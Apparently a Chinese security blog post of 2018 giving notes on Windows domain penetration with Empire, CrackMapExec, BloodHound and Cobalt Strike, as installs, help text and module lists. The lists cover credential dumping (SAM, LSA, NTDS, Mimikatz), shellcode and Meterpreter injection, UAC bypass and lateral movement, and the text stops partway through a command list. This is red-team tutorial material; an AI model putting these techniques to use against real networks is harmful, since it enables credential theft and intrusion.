<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>域渗透实战简要总结 | shackle</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="内网渗透" />
  
  
  
  
  <meta name="description" content="域渗透实战简要总结 本文记录域渗透的一些Tip与坑点，老外们的技术与分享精神好多干货，学无止境。  不断更新ing~ Empire https://github.com/EmpireProject/Empire  ​    Empire是基于Powershell后渗透框架，之前NSA的武器库中就有这个神器。我这里的是2.5版本的，提供rest API，有PHP版本和官方node.js版的前端。但这">
<meta name="keywords" content="内网渗透">
<meta property="og:type" content="article">
<meta property="og:title" content="域渗透实战简要总结">
<meta property="og:url" content="https://shackles.top/2018/10/29/域渗透实战简要总结/index.html">
<meta property="og:site_name" content="shackle">
<meta property="og:description" content="域渗透实战简要总结 本文记录域渗透的一些Tip与坑点，老外们的技术与分享精神好多干货，学无止境。  不断更新ing~ Empire https://github.com/EmpireProject/Empire  ​    Empire是基于Powershell后渗透框架，之前NSA的武器库中就有这个神器。我这里的是2.5版本的，提供rest API，有PHP版本和官方node.js版的前端。但这">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/UqKswX6rtV34.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/nrz5mH5Ah9Kl.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/558WMKnNVaYQ.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/zwIq1GaC13ke.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/IlOV34AFS20x.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/59MxERtRsAzf.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/wrfQjtc5bam7.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/FobbiBWwAvyX.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/4WR9tTEc46Wr.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/0nCBot3LSOtW.png?imageslim">
<meta property="og:image" content="https://user-images.githubusercontent.com/27856212/29992549-12d45854-8f6c-11e7-95c7-c2892582f56f.PNG">
<meta property="og:image" content="https://cloud.githubusercontent.com/assets/27856212/26449039/2b43a742-411e-11e7-8ac4-f003c8060654.PNG">
<meta property="og:image" content="https://cloud.githubusercontent.com/assets/27856212/26449045/2e4a13c2-411e-11e7-83e4-2b57babdbbdd.PNG">
<meta property="og:image" content="https://cloud.githubusercontent.com/assets/27856212/25680015/5eeab692-301d-11e7-8b85-914fe928e426.PNG">
<meta property="og:image" content="https://cloud.githubusercontent.com/assets/27856212/26449054/36d33172-411e-11e7-818d-7f0702a40712.PNG">
<meta property="og:image" content="https://cloud.githubusercontent.com/assets/27856212/26449031/1ffb0aba-411e-11e7-9138-f23de966ac4b.PNG">
<meta property="og:image" content="https://cloud.githubusercontent.com/assets/27856212/26449228/14f41a48-411f-11e7-8690-3ce3c1541738.PNG">
<meta property="og:image" content="https://user-images.githubusercontent.com/27856212/28122833-5bee8d72-66ed-11e7-8d0b-332f32627c62.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/27856212/40030114-f1bb39d2-57a5-11e8-9b99-ea076a852503.png">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/dER5wL6wIqnI.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/fnOHIfb9jyJO.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/lkvggvnySPdd.png?imageslim">
<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/vC5HeUcUtu5b.png?imageslim">
<meta property="og:updated_time" content="2019-02-19T05:12:23.358Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="域渗透实战简要总结">
<meta name="twitter:description" content="域渗透实战简要总结 本文记录域渗透的一些Tip与坑点，老外们的技术与分享精神好多干货，学无止境。  不断更新ing~ Empire https://github.com/EmpireProject/Empire  ​    Empire是基于Powershell后渗透框架，之前NSA的武器库中就有这个神器。我这里的是2.5版本的，提供rest API，有PHP版本和官方node.js版的前端。但这">
<meta name="twitter:image" content="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/UqKswX6rtV34.png?imageslim">
  
    <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo1.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo1.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
/*    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}*/


  </style>
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>
  <script src="/js/bootstrap.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    <link rel="stylesheet" href="/css/dialog.css">
  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  

</head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        <header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo1.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">首页</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">归档</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">关于</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(无标题)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-域渗透实战简要总结" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      域渗透实战简要总结
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/10/29/域渗透实战简要总结/" class="article-date">
	  <time datetime="2018-10-28T17:03:56.000Z" itemprop="datePublished">2018-10-29</time>
	</a>

      
      


    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="域渗透实战简要总结"><a href="#域渗透实战简要总结" class="headerlink" title="域渗透实战简要总结"></a>域渗透实战简要总结</h1><blockquote>
<p>本文记录域渗透的一些Tip与坑点，老外们的技术与分享精神好多干货，学无止境。</p>
</blockquote>
<p>不断更新ing~</p>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><blockquote>
<p><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>
</blockquote>
<p>​    Empire是基于Powershell后渗透框架，之前NSA的武器库中就有这个神器。我这里的是2.5版本的，提供rest API，有PHP版本和官方node.js版的前端。但这些GUI都不好用，有不少Bug。另外需要注意的是Empire版本问题，版本的命令可以有所差别,官方文档也是更新不及时。</p>
<p>可参考徐大大的两篇文章，版本是2.3。</p>
<h5 id="一篇文章精通PowerShell-Empire-2-3（上）"><a href="#一篇文章精通PowerShell-Empire-2-3（上）" class="headerlink" title="一篇文章精通PowerShell Empire 2.3（上）"></a>一篇文章精通PowerShell Empire 2.3（上）</h5><p><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87328</a></p>
<h5 id="一篇文章精通PowerShell-Empire-2-3（下）"><a href="#一篇文章精通PowerShell-Empire-2-3（下）" class="headerlink" title="一篇文章精通PowerShell Empire 2.3（下）"></a>一篇文章精通PowerShell Empire 2.3（下）</h5><p><a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87333</a></p>
<p>如下安装命令，官方提供了一键脚本，linux下kali与ubuntu都是支持的。项目原理是类似Metasploit、先建立Listeners，这里话简单看一写它的架构。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/UqKswX6rtV34.png?imageslim" alt="mark"></p>
<p>​    安装很简单，apt下载些包，pip安装python依赖。自动安装，最后需要设置数据库密码。也可以用data，目录下的rest.sh重置数据库。项目结构很清晰。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br><span class="line"></span><br><span class="line">cd Empire</span><br><span class="line"></span><br><span class="line">cd setup</span><br><span class="line"></span><br><span class="line">sudo ./install.sh</span><br><span class="line"></span><br><span class="line">python empire --rest --username admin --password password</span><br></pre></td></tr></table></figure>
<p>启动  开启1337端口，rest api。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/nrz5mH5Ah9Kl.png?imageslim" alt="mark"></p>
<h5 id="常用命令-直接help"><a href="#常用命令-直接help" class="headerlink" title="常用命令  直接help"></a>常用命令  直接help</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listenters</span><br><span class="line">help</span><br></pre></td></tr></table></figure>
<p>​    这里的module，分python版和powershell，不用多说啦，powershell只是用在windows平台下面，modules下面的文件只是python入口文件最后调用的还是data文件夹下面的powershell payload。python版的用在，linux与osx下面。大概分为下面几个大类。需要看到的时候在help就可以了。</p>
<h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><blockquote>
<p><a href="https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md" target="_blank" rel="noopener">https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code_execution	代码执行</span><br><span class="line">collection		信息收集</span><br><span class="line">credentials		凭证	</span><br><span class="line">exfiltration	数据窃取</span><br><span class="line">exploitation</span><br><span class="line">lateral_movement 横向</span><br><span class="line">management		管理</span><br><span class="line">persistence		权限维持</span><br><span class="line">privesc		提权</span><br><span class="line">recon		侦查</span><br><span class="line">situational_awareness</span><br><span class="line">trollsploit</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/558WMKnNVaYQ.png?imageslim" alt="mark"></p>
<p>usestager</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/zwIq1GaC13ke.png?imageslim" alt="mark"></p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/IlOV34AFS20x.png?imageslim" alt="mark"></p>
<p>​    </p>
<p>​    用Base64解码。看到发送的Python payload，大概的原理是客户端先判断有没有Little Snitch，直接用python2中原生urllib2库请求我们Empire 的http listener，的ip地址端口，这里的listener是由flask提供server，验证客户端来的cookie，相当于模拟正常的web流量。加密混淆建立个长连接。同样Powershell也这个原理。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/59MxERtRsAzf.png?imageslim" alt="mark"></p>
<p>payload执行后，还要rm。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/wrfQjtc5bam7.png?imageslim" alt="mark"></p>
<p>客户端执行后，agent上线。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/FobbiBWwAvyX.png?imageslim" alt="mark"></p>
<p>接下来就可以进行后渗透攻击。</p>
<h3 id="PSattack：一个渗透测试中使用的万能框架"><a href="#PSattack：一个渗透测试中使用的万能框架" class="headerlink" title="PSattack：一个渗透测试中使用的万能框架"></a>PSattack：一个渗透测试中使用的万能框架</h3><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><blockquote>
<p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></p>
<p><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/" target="_blank" rel="noopener">https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/</a></p>
</blockquote>
<p>作者两篇文章，由于文章早点现在这些命令有些不同。</p>
<p><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html</a></p>
<p><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html</a></p>
<p>这个项目是一些之前的项目的集成、</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Impacket</span><br><span class="line">Pywinrm</span><br><span class="line">Pywerview</span><br><span class="line">PowerSploit</span><br><span class="line">Invoke-Obfuscation</span><br><span class="line">Invoke-Vnc</span><br><span class="line">Mimikittenz</span><br><span class="line">NetRipper</span><br><span class="line">RandomPS-Scripts</span><br><span class="line">SessionGopher</span><br><span class="line">Mimipenguin</span><br></pre></td></tr></table></figure>
<p>kali 下面一键安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br></pre></td></tr></table></figure>
<p>值得注意的是项目的cmedb 命令可以用Empire的 Rest Api</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec	参数：</span><br><span class="line">  target	包含目标列表的目标IP，范围，CIDR（s），主机名，FQDN或文件</span><br><span class="line"></span><br><span class="line">可选参数：</span><br><span class="line">  -h,--help			显示此帮助消息并退出</span><br><span class="line">  -v,--version		显示程序的版本号并退出</span><br><span class="line">  -t 	THREADS		设置要使用的并发线程数（默认值：100）</span><br><span class="line">  -id CRED_ID [CRED_ID ...]		  用于身份验证的数据库凭据ID</span><br><span class="line">  -u USERNAME [USERNAME ...]	   用户名或包含用户名的文件</span><br><span class="line">  -d DOMAIN				域名</span><br><span class="line">  --local-auth在本地验证每个目标</span><br><span class="line">  -p PASSWORD [PASSWORD ...]		 包含密码的密码或文件</span><br><span class="line">  -H HASH [HASH ...] 				NTLM哈希值或包含NTLM哈希值的文件</span><br><span class="line">  -M MODULE， --Module模块				 Payload模块使用</span><br><span class="line">  -o MODULE_OPTION [MODULE_OPTION ...]                  有效载荷模块选项</span><br><span class="line">  -L，--list-modules列出可用模块</span><br><span class="line">  --show-options			显示模块选项</span><br><span class="line">  --share SHARE				指定共享（默认值：C $）</span><br><span class="line">  --smb-port &#123;139,445&#125; 		SMB端口（默认值：445）</span><br><span class="line">  --mssql-port PORT 		MSSQL端口（默认值：1433）</span><br><span class="line">  --server &#123;http，https&#125;  		使用所选服务器（默认值：https）</span><br><span class="line">  --server-host HOST 				IP将服务器绑定到（默认值：0.0.0.0）</span><br><span class="line">  --server-port PORT			在指定端口上启动服务器</span><br><span class="line">  --timeout TIMEOUT			每个线程的最大超时时间（秒）（默认值：20）</span><br><span class="line">  --gfail-limit 			LIMIT全局失败登录尝试的最大数量</span><br><span class="line">  --ufail-limit 			LIMIT每个用户名的最大失败登录尝试次数</span><br><span class="line">  --fail-limit 				LIMIT每个主机的最大失败登录尝试次数</span><br><span class="line">  --verbose启用详细输出</span><br><span class="line"></span><br><span class="line">凭证收集：</span><br><span class="line">  收集凭据的选项</span><br><span class="line"></span><br><span class="line">  --sam Dump来自目标系统的SAM哈希值</span><br><span class="line">  --lsa从目标系统中转储LSA的秘密</span><br><span class="line">  --ntds &#123;vss，drsuapi&#125;使用指定的方法从目标DC转储NTDS.ditdrsuapi是最快的）</span><br><span class="line">  --ntds-history转储NTDS.dit密码历史记录</span><br><span class="line">  --ntds-pwdLastSet显示每个NTDS.dit帐户的pwdLastSet属性</span><br><span class="line">  --wdigest &#123;enable，disable&#125; 创建/删除'UseLogonCredential'注册表项，在Windows上启用WDigest信用转储&gt; = 8.1</span><br><span class="line"></span><br><span class="line">制图/枚举：</span><br><span class="line">  映射/枚举选项</span><br><span class="line"></span><br><span class="line">  --shares枚举共享和访问权限</span><br><span class="line">  --uac检查UAC状态</span><br><span class="line">  --sessions枚举活动会话</span><br><span class="line">  --disks枚举磁盘</span><br><span class="line">  --users枚举用户</span><br><span class="line">  --rid-brute [MAX_RID] 通过强制RID枚举用户（默认值：4000）</span><br><span class="line">  --pass-pol转储密码策略</span><br><span class="line">  --lusers枚举已登录的用户</span><br><span class="line">  --wmi QUERY发出指定的WMI查询</span><br><span class="line">  --wmi-namespace NAMESPACEWMI命名空间（默认值：//./root/cimv2）</span><br><span class="line"></span><br><span class="line">爬虫：</span><br><span class="line">  爬虫的选择</span><br><span class="line"></span><br><span class="line">  --spider [FOLDER]文件夹到蜘蛛（默认：根目录）</span><br><span class="line">  --content启用文件内容搜索</span><br><span class="line">  --exclude-dirs DIR_LIST目录排除蜘蛛</span><br><span class="line">  --pattern PATTERN [PATTERN ...]要在文件夹，文件名和文件内容中搜索的模式</span><br><span class="line">  --regex REGEX [REGEX ...]正则表达式搜索文件夹，文件名和文件内容</span><br><span class="line">  --depth DEPTH Spider递归深度（默认值：10）</span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">  执行命令的选项</span><br><span class="line"></span><br><span class="line">  --exec-method &#123;smbexec，wmiexec，atexec&#125; 执行命令的方法。在MSSQL模式下忽略（默认值：wmiexec）</span><br><span class="line">  --force-ps32强制PowerShell命令在32位进程中运行</span><br><span class="line">  --no-output不检索命令输出</span><br><span class="line">  -x COMMAND执行指定的命令</span><br><span class="line">  -X PS_COMMAND执行指定的PowerShell命令</span><br><span class="line"></span><br><span class="line">MSSQL交互：</span><br><span class="line">  与MSSQL DB交互的选项</span><br><span class="line">  </span><br><span class="line">  --mssql将crackmapexec切换到MSSQL模式。如果提供凭据，则将对所有发现的MSSQL DB进行身份验证</span><br><span class="line">  --mssql-query QUERY对MSSQL DB执行指定的查询</span><br><span class="line">  --mssql-auth &#123;windows，normal&#125;要使用的MSSQL身份验证类型（默认值：windows）</span><br></pre></td></tr></table></figure>
<p>主要还是以下这些模块。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] empire_exec		使用Empire的RESTful API为指定的侦听器生成启动器并执行它</span><br><span class="line">[*] mimikittenz		执行Mimikittenz</span><br><span class="line">[*] rundll32_exec	使用rundll32和Windows的本机JavaScript解释器执行命令</span><br><span class="line">[*] shellinject		下载指定的原始shellcode并使用PowerSploit的Invoke-Shellcode.ps1脚本将其注入内存</span><br><span class="line">[*] com_exec		使用COM scriptlet执行命令以绕过白名单</span><br><span class="line">[*] enum_chrome		使用Powersploit的Invoke-Mimikatz.ps1脚本解密已保存的Chrome密码</span><br><span class="line">[*] tokens			使用Powersploit的Invoke-TokenManipulation枚举可用的令牌</span><br><span class="line">[*] mimikatz		执行PowerSploit的Invoke-Mimikatz.ps1脚本</span><br><span class="line">[*] powerview Wrapper for PowerView的功能</span><br><span class="line">[*] peinject		下载指定的DLL/EXE并使用PowerSploit的Invoke-ReflectivePEInjection.ps1脚本将其注入内存</span><br><span class="line">[*] tokenrider		允许使用权限而不是转储凭据进行自动令牌枚举，模拟和大规模横向传播</span><br><span class="line">[*] metinject		下载Meterpreter stager并使用PowerSploit的Invoke-Shellcode.ps1脚本将其注入内存</span><br><span class="line">[*] eventvwr_bypass		使用eventvwr.exe无文件UAC绕过执行命令</span><br></pre></td></tr></table></figure>
<h3 id="Bloodhound-域攻击关系图"><a href="#Bloodhound-域攻击关系图" class="headerlink" title="Bloodhound  域攻击关系图"></a>Bloodhound  域攻击关系图</h3><blockquote>
<p><a href="https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collection-Intro" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collection-Intro</a></p>
<p><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/" target="_blank" rel="noopener">https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/</a></p>
<p><a href="https://www.youtube.com/watch?v=lxd2rerVsLo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=lxd2rerVsLo</a></p>
</blockquote>
<p>python 客户端<a href="https://github.com/fox-it/BloodHound.py" target="_blank" rel="noopener">https://github.com/fox-it/BloodHound.py</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bloodhound</span><br></pre></td></tr></table></figure>
<p>基于 Neo4j数据库,需要改密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br></pre></td></tr></table></figure>
<p>在终端上执行,GUI界面，输入数据库的地址、端口用户密码。可以多客户端使用，跨平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound</span><br></pre></td></tr></table></figure>
<h2 id="CobaltStrke"><a href="#CobaltStrke" class="headerlink" title="CobaltStrke"></a>CobaltStrke</h2><blockquote>
<h5 id="列表集合"><a href="#列表集合" class="headerlink" title="列表集合"></a>列表集合</h5><p><a href="https://github.com/invokethreatguy/CSASC" target="_blank" rel="noopener">https://github.com/invokethreatguy/CSASC</a></p>
</blockquote>
<p>Cobalt Strike 的一些好用的插件，可以让我们更加清楚和方便的进行工作。</p>
<h4 id="Bean-COMMAD"><a href="#Bean-COMMAD" class="headerlink" title="Bean COMMAD"></a>Bean COMMAD</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">EDR_Query		查询所有安装的主要EDR产品的系统</span><br><span class="line">ProcessMonitor	启动/停止并更改进程监视器的间隔时间</span><br><span class="line">RedRepo			一个庞大的命令库和红色团队提示</span><br><span class="line">audit_uac		审核BypassUAC方法成功的主机</span><br><span class="line">browserpivot	设置浏览器数据透视会话</span><br><span class="line">bypassuac		在高完整性过程中生成会话</span><br><span class="line">cancel			取消正在进行的下载</span><br><span class="line">cd				更改目录</span><br><span class="line">check_msbuild	在目标上查找.NET v4.0.30319</span><br><span class="line">checkin			致电主页并发布数据</span><br><span class="line">clear			明确的Bean队列</span><br><span class="line">com-exec		使用DCOM进行横向运动</span><br><span class="line">covertvpn		